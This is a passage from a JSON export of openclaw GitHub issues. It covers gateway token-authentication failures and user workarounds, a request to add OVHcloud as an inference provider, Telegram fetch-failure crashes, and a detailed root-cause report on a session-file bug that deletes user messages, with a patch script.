      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14144",
      "createdAt": "2026-02-11T15:38:28Z",
      "updatedAt": "2026-02-11T15:39:20Z",
      "author": "oneles",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "web-ui"
        ]
      }
    },
    {
      "number": 1690,
      "title": "Webchat UI fails to authenticate: 'gateway token missing' even with token in URL",
      "body": "## Bug Description\n\nThe webchat/dashboard UI fails to connect to the gateway websocket with the error:\n\n```\ndisconnected (1008): unauthorized: gateway token missing (set gateway.remote.token to match gateway.auth.token)\n```\n\n## Environment\n- macOS 26.2 (arm64)\n- Node 25.2.1\n- Clawdbot version: 2026.1.22\n- Gateway bound to loopback (127.0.0.1:18789)\n- Auth mode: token\n\n## Configuration\n```json\n{\n  \"gateway\": {\n    \"mode\": \"local\",\n    \"auth\": {\n      \"mode\": \"token\",\n      \"token\": \"<redacted>\"\n    },\n    \"port\": 18789,\n    \"bind\": \"loopback\",\n    \"remote\": {\n      \"token\": \"<redacted>\"  // Added this to match auth.token, still fails\n    }\n  }\n}\n```\n\n## Steps to Reproduce\n1. Configure gateway with `auth.mode: \"token\"` and set a token\n2. Run `clawdbot gateway start`\n3. Run `clawdbot dashboard` (or open `http://127.0.0.1:18789/chat?token=<token>`)\n4. Dashboard UI loads but websocket connection fails with unauthorized error\n\n## What I Tried\n- Adding token to URL query string: `?token=xxx` — doesn't work\n- Running `clawdbot dashboard` which should provide tokenized URL — doesn't work\n- Adding `gateway.remote.token` to config to match `gateway.auth.token` — doesn't work\n- Setting `gateway.auth.mode: \"off\"` — works but breaks other connections (Claude Code)\n\n## Expected Behavior\nThe webchat UI should:\n1. Read the token from the URL `?token=...` parameter, OR\n2. Read it from `gateway.remote.token` in config, OR\n3. Prompt the user to enter the token in the UI\n\n## Actual Behavior\nThe HTML/JS loads fine but the websocket connection is rejected with 1008 unauthorized.\n\n## Workaround\nUse terminal CLI (`clawdbot chat` or `clawdbot tui`) instead of browser webchat.\n\n## Additional Context\n- Gateway health check returns 200 OK\n- `clawdbot status` shows gateway running and reachable\n- Other connections (WhatsApp, Claude Code) work fine with auth enabled",
      "state": "closed",
      "comments": 13,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/1690",
      "createdAt": "2026-01-25T03:55:16Z",
      "updatedAt": "2026-02-11T15:31:40Z",
      "author": "jasonsterling13-max",
      "labels": [],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "web-ui",
          "tui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3805812580,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1690#issuecomment-3805812580",
          "createdAt": "2026-01-27T15:19:23Z",
          "updatedAt": "2026-01-27T15:19:23Z",
          "author": "Dyl777",
          "body": "Currently using Clawdbot 2026.1.24 and am still having the issue. I have tried both moltbot 2026.1.24 and Clawdbot 2026.1.24 Windows 11 Docker installation via ./docker-setup.sh file"
        },
        {
          "id": 3805834669,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1690#issuecomment-3805834669",
          "createdAt": "2026-01-27T15:23:26Z",
          "updatedAt": "2026-01-27T15:23:26Z",
          "author": "Dyl777",
          "body": "<img width=\"1277\" height=\"707\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/92118aff-0413-4bcd-8081-3f967e12ab35\" />"
        },
        {
          "id": 3811525859,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1690#issuecomment-3811525859",
          "createdAt": "2026-01-28T14:08:01Z",
          "updatedAt": "2026-01-28T14:08:01Z",
          "author": "itxaiohanglover",
          "body": "me too!\n\n<img width=\"1894\" height=\"753\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/1436c3a5-edb6-40c3-bc9e-f10d703b9c81\" />"
        },
        {
          "id": 3815440304,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1690#issuecomment-3815440304",
          "createdAt": "2026-01-29T04:32:36Z",
          "updatedAt": "2026-01-29T04:32:36Z",
          "author": "hmendes00",
          "body": "I had the same issue running from wsl. I found out that I could run `docker compose run --rm moltbot-cli doctor --fix`. Then I ran the `docker compose run --rm moltbot-cli pairing list telegram` to approve and it was empty. I did the `docker compose run --rm moltbot-cli onboard` to re-setup with same parameters and also sent a new message to my bot so it would generate a new code. When I ran `docker compose run --rm moltbot-cli pairing list telegram` again it displayed the code and I just had to run `docker compose run --rm moltbot-cli pairing approve telegram <the-code>` and it worked. Dashboard is still broken though, but the AI answered on telegram"
        },
        {
          "id": 3818948743,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1690#issuecomment-3818948743",
          "createdAt": "2026-01-29T16:52:04Z",
          "updatedAt": "2026-01-29T16:52:33Z",
          "author": "amunrarara",
          "body": "I experienced the same issue, which I resolved by performing the following steps:\n\n1. `cat ~/.clawdbot/clawdbot.json`\n2. Copy `gateway.auth.token`\n3. Paste in `<dashboard_url:dashboard_port/>overview > Gateway Access > Gateway Token`\n4. Click `Connect`\n\nGood to go!"
        },
        {
          "id": 3821603677,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1690#issuecomment-3821603677",
          "createdAt": "2026-01-30T03:26:48Z",
          "updatedAt": "2026-01-30T03:26:48Z",
          "author": "Dyl777",
          "body": "I will just create a new issue for this; my own issue is that the gateway itself will not start (enabling systemd=true and restarting wsl doesnot work), using 'docker -d ...' which uses a daemon for the container doesnot work, even 'docker ... clawdbotcli -install-daemon' doesnot work, tried running moltbot in foreground (docker ... clawdbotcli ... -foreground), i just tried @hmendes00 method however my gateway doesn't even start before even connecting to telegram so it doesn't work, trying @amunrarara method, it still doesnot work shows 'disconnected (1008): pairing required', because the gateway itself doesnot even start or stay alive long enough, I NEED A SOLUTION TO 'Error: gateway closed (1006 abnormal closure (no close frame)): no close reason\nGateway target: ws://127.0.0.1:18789\nSource: local loopback\nConfig: /home/node/.clawdbot/clawdbot.json\nBind: lan'\n\n<img width=\"1197\" height=\"298\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/97b15622-2cd5-452c-a1c8-9a536c0a161f\" />"
        },
        {
          "id": 3830253552,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1690#issuecomment-3830253552",
          "createdAt": "2026-02-01T03:25:52Z",
          "updatedAt": "2026-02-01T03:25:52Z",
          "author": "sundeepgupta",
          "body": "@Dyl777 I was getting the same with macOS Docker setup and this work around worked:\n\nThis worked for me on macOS:\n\nThat error is expected: the CLI/UI is sending a device identity, and because the gateway sees the connection as non‑local, it requires device pairing. You don’t have a paired operator yet, so everything is stuck.\n\nFast bootstrap (recommended):\n\nTemporarily disable device identity for the Control UI by adding to `openclaw.json`:\n\n```json\n{\n  \"gateway\": {\n    \"controlUi\": { \"dangerouslyDisableDeviceAuth\": true }\n  }\n}\n```\n\nRestart the gateway Docker container:\n\nIn the UI, approve the pending device pairing (Devices/Nodes section).\n\nRemove dangerouslyDisableDeviceAuth and restart again."
        },
        {
          "id": 3836548364,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1690#issuecomment-3836548364",
          "createdAt": "2026-02-02T17:10:15Z",
          "updatedAt": "2026-02-02T17:10:15Z",
          "author": "mcclaskiem",
          "body": "@sundeepgupta I did this approach and was finally able to get past the pairing required but it is still not showing up devices as a pair request. Did you have do anything extra to get the pending request to show?"
        },
        {
          "id": 3836809651,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1690#issuecomment-3836809651",
          "createdAt": "2026-02-02T18:02:43Z",
          "updatedAt": "2026-02-02T18:02:43Z",
          "author": "sundeepgupta",
          "body": "No I didnt Sent from my iPhoneOn Feb 2, 2026, at 12:10 PM, Max ***@***.***> wrote:﻿mcclaskiem left a comment (openclaw/openclaw#1690)\r\n@sundeepgupta I did this approach and was finally able to get past the pairing required but it is still not showing up devices as a pair request. Did you have do anything extra to get the pending request to show?\r\n\r\n—Reply to this email directly, view it on GitHub, or unsubscribe.You are receiving this because you were mentioned.Message ID: ***@***.***>"
        },
        {
          "id": 3837395145,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1690#issuecomment-3837395145",
          "createdAt": "2026-02-02T20:48:36Z",
          "updatedAt": "2026-02-02T20:48:50Z",
          "author": "guerillagorilla",
          "body": "I was able to get passed this without modifying openclaw.json by listing pending device requests based on tokens:\n```\ndocker compose -f docker-compose.yml exec openclaw-gateway \\\n  node dist/index.js devices list --token \"<token>\"\n```\n\nThis will output the Pending Requests which youcan then you to approve:\n```\ndocker compose -f docker-compose.yml exec openclaw-gateway \\\n  node dist/index.js devices approve <requestId> --token \"<token>\"\n```\n\nAfter that, the browser is paired and should reconnect without the issue.  Openclaw UI will also show \"Connected\" as expected."
        },
        {
          "id": 3873898299,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1690#issuecomment-3873898299",
          "createdAt": "2026-02-09T21:14:13Z",
          "updatedAt": "2026-02-09T21:14:13Z",
          "author": "DColl",
          "body": "> [@Dyl777](https://github.com/Dyl777) I was getting the same with macOS Docker setup and this work around worked:\n> \n> This worked for me on macOS:\n> \n> That error is expected: the CLI/UI is sending a device identity, and because the gateway sees the connection as non‑local, it requires device pairing. You don’t have a paired operator yet, so everything is stuck.\n> \n> Fast bootstrap (recommended):\n> \n> Temporarily disable device identity for the Control UI by adding to `openclaw.json`:\n> \n> {\n>   \"gateway\": {\n>     \"controlUi\": { \"dangerouslyDisableDeviceAuth\": true }\n>   }\n> }\n> \n> Restart the gateway Docker container:\n> \n> In the UI, approve the pending device pairing (Devices/Nodes section).\n> \n> Remove dangerouslyDisableDeviceAuth and restart again.\n\nuse \"allowInsecureAuth\" is less dangerous and working. It happens to be an issue with docker"
        },
        {
          "id": 3885110751,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1690#issuecomment-3885110751",
          "createdAt": "2026-02-11T15:17:15Z",
          "updatedAt": "2026-02-11T15:17:15Z",
          "author": "ShahriarArabpour",
          "body": "\nIf you are seeing the red error disconnected (1008): unauthorized: gateway token missing on your OpenClaw dashboard, here is how to find your token and fix it manually.\n\nupdated process:\n\n1. Locate your config file\nOpen your terminal and read the current configuration file located at ~/.openclaw/openclaw.json.\nYou can use this command:\n\ncat ~/.openclaw/openclaw.json\n\n2. Find the Token\nLook for the gateway section inside the JSON output. You need the string under auth > token.\nIt looks like this:\n\n\"gateway\": {\n  \"port\": 18789,\n  ...\n  \"auth\": {\n    \"mode\": \"token\",\n    \"token\": \"YOUR_LONG_TOKEN_STRING_IS_HERE\"\n  }\n}\n\nCopy that long token string.\n\n3. Authenticate the Dashboard\n\n1. Open your dashboard URL (usually http://127.0.0.1:18789).\n2. Go to Settings (or look for the connection input box if prompted).\n3. Paste the token you copied into the Gateway Token field.\n4. Click Connect.\nYour dashboard should now turn green and connect successfully!"
        },
        {
          "id": 3885203469,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1690#issuecomment-3885203469",
          "createdAt": "2026-02-11T15:31:39Z",
          "updatedAt": "2026-02-11T15:31:39Z",
          "author": "Jamesits",
          "body": "Web UI works, but CLI does not work, even if I run the CLI from the same container as the gateway.\n\n```\n/app$ node dist/index.js devices list\n\n🦞 OpenClaw 2026.2.9 (unknown) — I can run local, remote, or purely on vibes—results may vary with DNS.\n\n│\ngateway connect failed: Error: unauthorized: gateway token mismatch (set gateway.remote.token to match gateway.auth.token)\n◇  \n[openclaw] CLI failed: Error: gateway closed (1008): unauthorized: gateway token mismatch (set gateway.remote.token to match gateway.auth.token)\nGateway target: ws://172.20.0.2:18789\nSource: local lan 172.20.0.2\nConfig: /home/node/.openclaw/openclaw.json\nBind: lan\n    at Object.onClose (file:///app/dist/call-RHogJfI0.js:265:10)\n    at WebSocket.<anonymous> (file:///app/dist/net-BS4Hcnhx.js:1458:23)\n    at WebSocket.emit (node:events:519:28)\n    at WebSocket.emitClose (/app/node_modules/.pnpm/ws@8.19.0/node_modules/ws/lib/websocket.js:273:10)\n    at Socket.socketOnClose (/app/node_modules/.pnpm/ws@8.19.0/node_modules/ws/lib/websocket.js:1346:15)\n    at Socket.emit (node:events:519:28)\n    at TCP.<anonymous> (node:net:346:12)\n```"
        }
      ]
    },
    {
      "number": 10419,
      "title": "[Feature]: Integrate EU Inference: OVHcloud AI Endpoints",
      "body": "## Summary\n\nOpenclaw is an awesome tool that supports a lot of Inference Provider. Unfortunately, it only has US-based Inference Provider to power it. We would like to suggest a new inference provider, that is an alternative to give users access to sovereign LLMs, with data privacy (ZDR) and GDPR compliance.\n\n## Proposed solution\n\nhttps://github.com/openclaw/openclaw/pull/10424 supports OVHcloud AI Endpoints.\n\nOVHcloud is a serious actor in the cloud ecosystem, being the leading cloud provider in Europe.\nA guide has been written on how to deploy an instance on OVHcloud VPS: [https://help.ovhcloud.com/csm/en-ca-vps-install-openclaw?id=kb_article_view&sysparm_article=KB0074775](https://help.ovhcloud.com/csm/en-ca-vps-install-openclaw?id=kb_article_view&sysparm_article=KB0074775)\n\nOVHcloud AI Endpoints is already used in production for Kilo Code, Pydantic AI, LiteLLM, Hugging Face Inference Provider, and soon in gateways such as Vercel or Cloudflare.\n\nAs others provider have been merged, I took the initiative to create the PR since it looked correct for this feature. Let me know if it's too early!\n\n## Alternatives considered\n\nNA\n\n## Additional context\n\nLinks, screenshots, or related issues.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/10419",
      "createdAt": "2026-02-06T13:39:59Z",
      "updatedAt": "2026-02-11T15:25:10Z",
      "author": "eliasto",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway"
        ]
      }
    },
    {
      "number": 12971,
      "title": "Unhandled fetch failures crash Telegram provider",
      "body": "## Environment\n- Clawdbot version: 2026.1.24-3\n- OS: macOS (Darwin 25.1.0 arm64)\n- Node: v25.5.0\n\n## Issue\nIntermittent `TypeError: fetch failed` errors cause unhandled promise rejections, which crash and restart the Telegram provider. Messages in flight during the crash are lost.\n\n## Logs\n```\n2026-02-10T00:17:34.381Z error [clawdbot] Unhandled promise rejection: TypeError: fetch failed\n2026-02-10T00:17:38.130Z info gateway/channels/telegram [default] starting provider (@Simona_chimo_bot)\n2026-02-10T00:18:02.162Z error [clawdbot] Unhandled promise rejection: TypeError: fetch failed\n2026-02-10T00:18:04.686Z info gateway/channels/telegram [default] starting provider (@Simona_chimo_bot)\n```\n\n## Impact\n- 2 crashes in ~15 minutes observed\n- Messages being sent during crash are lost\n- Network to Telegram API is reachable (tested with curl)\n\n## Expected Behavior\nFetch failures should be caught and retried gracefully without crashing the provider.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12971",
      "createdAt": "2026-02-10T00:24:40Z",
      "updatedAt": "2026-02-11T15:20:59Z",
      "author": "isaacachar",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway"
        ]
      },
      "commentsData": [
        {
          "id": 3885134219,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12971#issuecomment-3885134219",
          "createdAt": "2026-02-11T15:20:59Z",
          "updatedAt": "2026-02-11T15:20:59Z",
          "author": "gregorgregor25",
          "body": "Adding another reproducible datapoint from a live Telegram deployment on the latest release.\n\n## Environment\n- OpenClaw: **2026.2.9**\n- Node: **v22.22.0**\n- OS: **Debian Linux 6.12.63 (x86_64)**\n- Channel: Telegram (group topic chats)\n\n## Symptoms\n- Intermittent missed/delayed bot replies in Telegram topics\n- Repeated log spam of transient network failures\n- Media fetch failures from Telegram file API during inbound photo handling\n\n## Key log evidence (same session window)\n- `2026-02-11T15:06:36.391Z` `handler failed: MediaFetchError: Failed to fetch media from https://api.telegram.org/file/...: TypeError: fetch failed`\n- `2026-02-11T15:09:28.683Z` `telegram sendChatAction failed: Network request for 'sendChatAction' failed!`\n- `2026-02-11T15:18:58.242Z` `telegram sendChatAction failed: Network request for 'sendChatAction' failed!`\n- Repeated throughout: `Non-fatal unhandled rejection (continuing): TypeError: fetch failed` (undici stack at `node:internal/deps/undici/undici:14902:13`)\n\n## Additional checks\n- `curl -4 https://api.telegram.org` => HTTP 302\n- `curl -6 https://api.telegram.org` => HTTP 302\n\nSo this does **not** appear to be IPv6-broken-host specific in this case; still seeing transient fetch failures and Telegram API operation failures on latest OpenClaw.\n\n## Impact\nGateway stays up, but Telegram UX degrades (silence/delays), especially around chat actions and media handling.\n\nHappy to provide fuller sanitized logs if you want a wider timestamp slice.\n"
        }
      ]
    },
    {
      "number": 12029,
      "title": "Session Amnesia: Orphan detection deletes legitimate user messages",
      "body": "# Bug: Orphaned user message removal causes complete conversation amnesia\n\n## TL;DR\n\nThe embedded runner deletes **every** user message from session JSONL files between runs. The orphan detection at `src/agents/pi-embedded-runner/run/attempt.ts` (~line 447) unconditionally removes any user message at the leaf position, treating it as \"orphaned\" — but in normal operation, the most recent user message is *always* at the leaf position. This causes total conversation amnesia: the model responds correctly using in-memory context, but the session file is silently rewritten without any user messages.\n\n**Severity:** Critical — silently destroys user conversation history on disk. Every user of the embedded runner with Anthropic models is affected.\n\n---\n\n## Environment\n\n| Item | Value |\n|------|-------|\n| OpenClaw Version | 2026.2.6-3 (npm global, commit 85ed6c7) |\n| OS | macOS (Darwin, Apple Silicon / Homebrew) |\n| Node | v22.x |\n| Channel | Telegram (polling mode) |\n| Model | Anthropic Claude Opus 4.5 |\n| Session scope | Default (`agent:main:main`) |\n\n---\n\n## How We Found It — The Debugging Journey\n\nThis took two days of investigation across multiple wrong leads before isolating the root cause.\n\n### Day 1: Suspected compaction (wrong)\n\nOur Telegram bot (Clawrl) couldn't remember anything between messages. We'd tell it something, it would acknowledge, then completely forget on the next message. Initial hypothesis: compaction was stripping history.\n\n**Action:** Removed compaction from config:\n```bash\nopenclaw config set agents.defaults.compaction.enabled false\n```\n\n**Result:** Amnesia continued. Compaction was a red herring — it had run once (`compactionCount: 1` in session index) but wasn't the ongoing cause.\n\n### Day 2, Phase 1: Suspected heartbeats/cron (wrong)\n\nDiscovered 22 cron jobs targeting the main agent. Session index showed `\"provider\": \"heartbeat\"` and hourly session creation timestamps. Hypothesis: heartbeats were overwriting Telegram session history.\n\n**Investigation:**\n```bash\n# Found 107 session files\nls ~/.openclaw/agents/main/sessions/*.jsonl | wc -l\n# → 107\n\n# Cron config showed \"isolated\" scope\nopenclaw cron list\n# → 22 entries, all with scope: \"isolated\"\n```\n\n**Result:** Cron jobs were creating *separate* session files, not overwriting the Telegram session. Red herring #2.\n\n### Day 2, Phase 2: Discovered zero user messages on disk\n\n```bash\njq -r '.message.role' ~/.openclaw/agents/main/sessions/6932318b*.jsonl | sort | uniq -c\n```\n```\n   2 assistant\n   2 toolResult\n```\n\n**Zero user messages.** The session JSONL contained only assistant responses and tool results. User messages existed in-memory during a run (the bot responded correctly!) but were never present on disk when the next run started.\n\n### Day 2, Phase 3: Traced to appendMessage → replaceMessages\n\nFound that `sessionManager.appendMessage` exists and *does* write user messages. But something was deleting them afterward. Searched for the log message reported in multiple GitHub issues:\n\n```bash\ngrep -i \"orphaned user\\|consecutive user\\|Removed orphaned\" \\\n  /opt/homebrew/lib/node_modules/openclaw/dist/extensionAPI.js\n```\n\nOutput included:\n```\nlog$2.warn`Removed orphaned user message to prevent consecutive user turns.`\n```\n\n### Day 2, Phase 4: Found the smoking gun\n\n```bash\ngrep -B 5 \"Removed orphaned user message\" \\\n  /opt/homebrew/lib/node_modules/openclaw/dist/extensionAPI.js\n```\n\n```javascript\ncacheTrace?.recordStage(\"prompt:before\", {\n    prompt: effectivePrompt,\n    messages: activeSession.messages\n});\nconst leafEntry = sessionManager.getLeafEntry();\nif (leafEntry?.type === \"message\" && leafEntry.message.role === \"user\") {\n    if (leafEntry.parentId) sessionManager.branch(leafEntry.parentId);\n    else sessionManager.resetLeaf();\n    const sessionContext = sessionManager.buildSessionContext();\n    activeSession.agent.replaceMessages(sessionContext.messages);\n    log$2.warn`Removed orphaned user message to prevent consecutive user turns.`;\n}\n```\n\n**This code runs at the start of every embedded runner attempt.** It checks if the last entry (leaf) in the session DAG is a user message. If so, it branches to the parent node (the previous assistant message), rebuilds the session context *without* the user message, and calls `replaceMessages` — which **rewrites the entire session JSONL file.**\n\n### Day 2, Phase 5: Ruled out other code paths\n\nWe verified that other session modification code was NOT the cause:\n\n| Code path | Status |\n|-----------|--------|\n| `limitHistoryTurns()` | Safe — returns all messages when `dmHistoryLimit` is undefined |\n| `validateAnthropicTurns()` | Safe — merges consecutive same-role messages, doesn't delete |\n| `sanitizeToolUseResultPairing()` | Safe — only affects tool_result blocks |\n| `contextPruning` | Safe — only modifies in-memory context, not disk |\n| **Orphan removal block** | **THE BUG** — unconditionally deletes leaf user messages |\n\n### Day 2, Phase 6: Applied fix, verified\n\n```bash\n# Backup\ncp extensionAPI.js extensionAPI.js.bak\n\n# Comment out the orphan removal block (lines 67101-67107 in v2026.2.6-3)\nsed -i '' '67101,67107s/^/\\/\\//' extensionAPI.js\n\n# Restart + clear session\nopenclaw gateway restart\n```\n\n**Before fix:**\n```\n$ jq -r '.message.role' session.jsonl | sort | uniq -c\n   2 assistant\n   2 toolResult\n```\n\n**After fix:**\n```\n$ jq -r '.message.role' session.jsonl | sort | uniq -c\n   9 assistant\n   8 toolResult\n   5 user\n```\n\nUser messages now persist. Conversation memory fully restored. Verified with multi-turn recall tests across multiple sessions and gateway restarts.\n\n---\n\n## Root Cause Analysis\n\n### The bug cycle\n\n```\n1. User sends message\n   → sessionManager.appendMessage() writes user message to JSONL ✅\n\n2. Embedded runner starts processing\n   → Model sees user message in memory, responds correctly ✅\n\n3. Assistant response generated\n   → appendAssistantMessageToSessionTranscript() saves response ✅\n\n4. Next user message arrives → new run starts\n\n5. Runner checks leaf entry\n   → getLeafEntry() returns the NEW user message (it's at the leaf position)\n\n6. Orphan detection fires\n   → \"This leaf is a user message → must be orphaned!\"\n   → branch(parentId) → jumps back to previous assistant message\n   → buildSessionContext() → rebuilds WITHOUT the user message\n   → replaceMessages() → REWRITES ENTIRE SESSION FILE ❌\n\n7. Session JSONL now contains only assistant + toolResult entries\n   → All user messages permanently deleted from disk\n\n8. Cycle repeats on every exchange\n```\n\n### Why the logic is fundamentally wrong\n\nThe orphan detection assumes: \"If the leaf entry is a user message when a new run starts, it must be an orphan from a failed previous run.\"\n\nIn reality: **The leaf entry is *always* a user message when a new run starts**, because:\n1. User sends message → appended to session (becomes leaf)\n2. New run starts to process that message\n3. Orphan check fires → deletes the message it was supposed to process\n\nThe check was designed to handle an edge case (failed runs leaving stale user messages) but triggers on the normal case (every single run).\n\n### Why it's hard to notice\n\nThe model still **responds correctly** because it uses the in-memory message array, which still contains the user message at the time of inference. The deletion only affects the persisted session file. This means:\n\n- The bot appears to work perfectly in single exchanges\n- Amnesia only manifests when the user expects multi-turn memory\n- Session files look \"valid\" (they contain messages, just not user ones)\n- The `replaceMessages` call doesn't error — it silently succeeds\n\n---\n\n## Suggested Fix\n\n### Option A: Only remove truly orphaned messages (recommended)\n\nA user message is only \"orphaned\" if it would create consecutive user turns. Check whether the *previous* entry is also a user message before removing:\n\n```typescript\n// In src/agents/pi-embedded-runner/run/attempt.ts\nconst leafEntry = sessionManager.getLeafEntry();\nif (leafEntry?.type === \"message\" && leafEntry.message.role === \"user\") {\n    // Only remove if this would create consecutive user turns\n    const parentEntry = leafEntry.parentId \n        ? sessionManager.getEntry(leafEntry.parentId) \n        : null;\n    const parentIsUser = parentEntry?.type === \"message\" \n        && parentEntry.message.role === \"user\";\n    \n    if (parentIsUser) {\n        // Actual consecutive user turns — safe to merge/remove\n        if (leafEntry.parentId) sessionManager.branch(leafEntry.parentId);\n        else sessionManager.resetLeaf();\n        const sessionContext = sessionManager.buildSessionContext();\n        activeSession.agent.replaceMessages(sessionContext.messages);\n        log.warn`Removed orphaned user message to prevent consecutive user turns.`;\n    }\n    // Otherwise: leaf is a legitimate user message — leave it alone\n}\n```\n\n### Option B: Add a config flag\n\nMake the behavior configurable via `transcriptPolicy`:\n\n```typescript\n// In transcript policy resolution\ntranscriptPolicy: {\n    removeOrphanedUserMessages: boolean; // default: false (safe default)\n}\n```\n\nCurrently, `transcriptPolicy` controls `validateAnthropicTurns`, `validateGeminiTurns`, and `repairToolUseResultPairing` — but there is no flag for orphan removal. Adding one would let users opt in to the aggressive behavior if needed.\n\n### Option C: Remove the block entirely\n\nThe orphan removal may not be necessary at all. The `validateAnthropicTurns` function already handles consecutive user turns by *merging* them (which is the correct approach). The orphan removal is a redundant, more destructive version of the same logic.\n\n---\n\n## Workaround (for current users)\n\n### Quick fix script\n\n```bash\n#!/bin/bash\n# fix-orphan-removal.sh — Patches OpenClaw/Clawdbot to prevent user message deletion\n# Safe to run multiple times. Survives gateway restarts, lost on npm update.\n# Detects both openclaw (bundled) and clawdbot (unbundled) layouts.\n\nNPM_ROOT=\"$(npm root -g)\"\nPATCHED=0\n\nfor TARGET in \\\n    \"$NPM_ROOT/openclaw/dist/extensionAPI.js\" \\\n    \"$NPM_ROOT/clawdbot/dist/agents/pi-embedded-runner/run/attempt.js\"; do\n\n    [ -f \"$TARGET\" ] || continue\n\n    # Check if already patched\n    if grep -q \"^//.*Removed orphaned user message\" \"$TARGET\" 2>/dev/null; then\n        echo \"Already patched: $TARGET\"\n        PATCHED=$((PATCHED + 1))\n        continue\n    fi\n\n    # Find the line number\n    LINE=$(grep -n \"Removed orphaned user message\" \"$TARGET\" | head -1 | cut -d: -f1)\n    if [ -z \"$LINE\" ]; then\n        echo \"SKIP: Orphan removal code not found in $TARGET (version may differ)\"\n        continue\n    fi\n\n    # Calculate block range (the if-block is 5-6 lines above the log line, plus closing brace)\n    START=$((LINE - 5))\n    END=$((LINE + 1))\n\n    # For the unbundled layout, the if-block has extra lines (braces on own lines)\n    if echo \"$TARGET\" | grep -q \"clawdbot\"; then\n        START=$((LINE - 9))\n        END=$((LINE + 2))\n    fi\n\n    # Backup\n    cp \"$TARGET\" \"$TARGET.bak-$(date +%Y%m%d)\"\n\n    # Comment out the block\n    sed -i '' \"${START},${END}s/^/\\/\\//\" \"$TARGET\"\n\n    echo \"Patched lines $START-$END in $TARGET\"\n    PATCHED=$((PATCHED + 1))\ndone\n\nif [ \"$PATCHED\" -eq 0 ]; then\n    echo \"ERROR: No patchable files found. Check your installation.\"\n    exit 1\nfi\n\necho \"\"\necho \"Restart gateway: openclaw gateway restart\"\n```\n\n### Verify the fix\n\n```bash\n# After patching + restarting, send a message via your channel, then:\njq -r '.message.role' ~/.openclaw/agents/main/sessions/*.jsonl | sort | uniq -c\n\n# Should show \"user\" entries. If only \"assistant\" and \"toolResult\", patch didn't apply.\n```\n\n---\n\n## Related Issues\n\nThese issues all report the same `\"Removed orphaned user message\"` log line but were diagnosed as symptoms rather than root cause:\n\n- **#5806** — Telegram bot stuck in infinite loop after restart. Logs show orphan removal on every reload. Workaround: delete session file. *Real cause: orphan removal deleting user context, causing the model to repeat itself.*\n- **#4650** — Tool use/result pairing breaks after `limitHistoryTurns`. The `replaceMessages` call that rewrites session files is the same code path used by orphan removal.\n- **#6788** — Transcript repair creates orphaned `tool_result` for aborted tool calls. Related to the broader transcript repair pipeline that the orphan removal is part of.\n- **#3815** (crash report by @parkerati) — Gateway crash logs show `\"Removed orphaned user message\"` during normal Telegram operation. The removal likely contributed to the instability.\n\n---\n\n## Appendix: Exact code locations in compiled dist\n\n**Version:** 2026.2.6-3 (commit 85ed6c7)  \n**Source file:** `src/agents/pi-embedded-runner/run/attempt.ts` (approximately line 447, based on diff context from #4650)\n\n### ⚠️ Important: Two different file layouts\n\nThe bug exists in **two different dist locations** depending on how you installed and which binary you're running. **This caught us — we patched the wrong file and spent hours thinking the fix hadn't worked.**\n\n#### Layout A: Standalone OpenClaw (`openclaw` package)\n\n**File:** `dist/extensionAPI.js` (single bundled file)  \n**Lines:** 67100-67107\n\n```javascript\n// Line 67100:  const leafEntry = sessionManager.getLeafEntry();\n// Line 67101:  if (leafEntry?.type === \"message\" && leafEntry.message.role === \"user\") {\n// Line 67102:      if (leafEntry.parentId) sessionManager.branch(leafEntry.parentId);\n// Line 67103:      else sessionManager.resetLeaf();\n// Line 67104:      const sessionContext = sessionManager.buildSessionContext();\n// Line 67105:      activeSession.agent.replaceMessages(sessionContext.messages);\n// Line 67106:      log$2.warn`Removed orphaned user message to prevent consecutive user turns. runId=${params.runId} sessionId=${params.sessionId}`);\n// Line 67107:  }\n```\n\n#### Layout B: Clawdbot wrapper (`clawdbot` package)\n\n**File:** `dist/agents/pi-embedded-runner/run/attempt.js` (unbundled, separate files)  \n**Lines:** 601-612\n\n```javascript\n// Line 600:  const leafEntry = sessionManager.getLeafEntry();\n// Line 601:  if (leafEntry?.type === \"message\" && leafEntry.message.role === \"user\") {\n// Line 602:      if (leafEntry.parentId) {\n// Line 603:          sessionManager.branch(leafEntry.parentId);\n// Line 604:      }\n// Line 605:      else {\n// Line 606:          sessionManager.resetLeaf();\n// Line 607:      }\n// Line 608:      const sessionContext = sessionManager.buildSessionContext();\n// Line 609:      activeSession.agent.replaceMessages(sessionContext.messages);\n// Line 610:      log.warn`Removed orphaned user message to prevent consecutive user turns. ` +\n// Line 611:          `runId=${params.runId} sessionId=${params.sessionId}`);\n// Line 612:  }\n```\n\n#### How to tell which one you're running\n\n```bash\nps aux | grep -i claw | grep gateway\n# If it shows \"clawdbot-gateway\" → patch Layout B (clawdbot)\n# If it shows \"openclaw\" → patch Layout A (openclaw)\n\n# Find the right file:\ngrep -rn \"Removed orphaned user message\" $(npm root -g)/clawdbot/ 2>/dev/null\ngrep -rn 